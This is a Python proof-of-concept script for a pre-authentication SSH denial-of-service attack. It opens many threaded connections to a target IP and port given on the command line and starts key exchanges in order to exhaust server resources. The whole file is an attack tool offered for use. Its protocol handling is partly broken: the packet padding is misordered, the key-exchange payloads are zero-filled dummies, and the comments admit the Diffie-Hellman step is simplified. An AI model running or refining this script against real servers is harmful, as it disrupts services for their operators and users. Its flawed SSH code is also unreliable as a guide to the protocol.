#!/usr/bin/env python3
import socket
import struct
import threading
import time
import sys

# SSH Protocol Constants
SSH_MSG_KEXINIT = 20
SSH_MSG_NEWKEYS = 21
SSH_DISCONNECT = 1

# Default SSH banner
SSH_BANNER = b"SSH-2.0-PoCClient\r\n"

def send_ssh_message(sock, msg_type, payload=b""):
    """Send an SSH message with proper length and padding."""
    # Calculate padding
    payload_len = len(payload)
    block_size = 8  # SSH uses 8-byte blocks for padding
    padding_needed = block_size - ((payload_len + 1 + 4) % block_size)
    if padding_needed < 4:
        padding_needed += block_size
    
    # Construct message: length (4 bytes) | payload | padding | padding length (1 byte)
    message = struct.pack(">I", payload_len + 1 + padding_needed) + payload + bytes(range(1, padding_needed + 1)) + struct.pack("B", padding_needed)
    sock.sendall(message)

def receive_ssh_message(sock):
    """Receive an SSH message and return the message type and payload."""
    # Read length
    length_data = sock.recv(4)
    if not length_data:
        return None, None
    length = struct.unpack(">I", length_data)[0]
    
    # Read message
    message = sock.recv(length)
    if not message:
        return None, None
    
    # Extract message type and payload
    msg_type = message[0]
    payload = message[1:-1]  # Exclude padding length
    return msg_type, payload

def initiate_kex_exhaustion(target_ip, target_port, num_connections):
    """Initiate multiple SSH connections to exhaust server resources via key exchange."""
    print(f"[*] Initiating {num_connections} SSH connections to {target_ip}:{target_port}...")
    
    threads = []
    for i in range(num_connections):
        thread = threading.Thread(target=kex_exhaustion_worker, args=(target_ip, target_port, i))
        threads.append(thread)
        thread.start()
        time.sleep(0.1)  # Small delay to stagger connections
    
    for thread in threads:
        thread.join()
    
    print("[*] All connections completed.")

def kex_exhaustion_worker(target_ip, target_port, conn_id):
    """Worker function to perform key exchange exhaustion on a single connection."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        
        # Send SSH banner
        sock.sendall(SSH_BANNER)
        
        # Receive server banner
        server_banner = sock.recv(1024)
        if not server_banner:
            print(f"[!] Connection {conn_id}: Failed to receive server banner.")
            sock.close()
            return
        
        print(f"[+] Connection {conn_id}: Received server banner: {server_banner.decode().strip()}")
        
        # Send SSH_MSG_KEXINIT to trigger key exchange
        kexinit_payload = b"\x00" * 64  # Minimal KEXINIT payload
        send_ssh_message(sock, SSH_MSG_KEXINIT, kexinit_payload)
        
        # Receive server's SSH_MSG_KEXINIT
        msg_type, payload = receive_ssh_message(sock)
        if msg_type == SSH_MSG_KEXINIT:
            print(f"[+] Connection {conn_id}: Server initiated key exchange.")
            
            # Perform Diffie-Hellman key exchange (simplified for PoC)
            # In a real attack, this would involve full DH operations
            # For demonstration, we just send a dummy KEXDH_INIT
            kexdh_init_payload = b"\x00" * 32  # Minimal KEXDH_INIT payload
            send_ssh_message(sock, 30, kexdh_init_payload)  # SSH_MSG_KEXDH_INIT
            
            # Receive server's KEXDH_REPLY
            msg_type, payload = receive_ssh_message(sock)
            if msg_type == 31:  # SSH_MSG_KEXDH_REPLY
                print(f"[+] Connection {conn_id}: Server completed key exchange.")
                
                # Send SSH_MSG_NEWKEYS to finalize key exchange
                send_ssh_message(sock, SSH_MSG_NEWKEYS)
                
                # Receive server's SSH_MSG_NEWKEYS
                msg_type, payload = receive_ssh_message(sock)
                if msg_type == SSH_MSG_NEWKEYS:
                    print(f"[+] Connection {conn_id}: Key exchange finalized.")
                else:
                    print(f"[!] Connection {conn_id}: Unexpected message type: {msg_type}")
            else:
                print(f"[!] Connection {conn_id}: Unexpected message type: {msg_type}")
        else:
            print(f"[!] Connection {conn_id}: Unexpected message type: {msg_type}")
        
        # Close connection to simulate dropping
        sock.close()
        print(f"[+] Connection {conn_id}: Closed.")
        
    except Exception as e:
        print(f"[!] Connection {conn_id}: Error - {e}")
    finally:
        try:
            sock.close()
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python poc_pre_auth_kex_exhaustion.py <target_ip> <target_port> <num_connections>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_connections = int(sys.argv[3])
    
    initiate_kex_exhaustion(target_ip, target_port, num_connections)
